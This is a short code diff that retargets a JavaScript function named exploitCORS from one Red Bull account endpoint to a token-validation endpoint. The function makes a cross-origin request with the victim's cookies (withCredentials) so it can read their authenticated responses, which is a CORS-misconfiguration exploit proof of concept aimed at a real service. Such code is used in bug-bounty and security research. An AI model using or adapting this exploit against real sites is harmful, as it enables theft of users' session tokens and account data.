@@ -16,7 +16,7 @@
 function exploitCORS(){
     var req = new XMLHttpRequest();
     req.onload = reqListener;
-    req.open('get','https://account.redbull.com/profile/settings',true);
+    req.open('get','https://uim.redbull.com/uim/api/token/validate',true);
     req.withCredentials = true;
     req.send();
 }
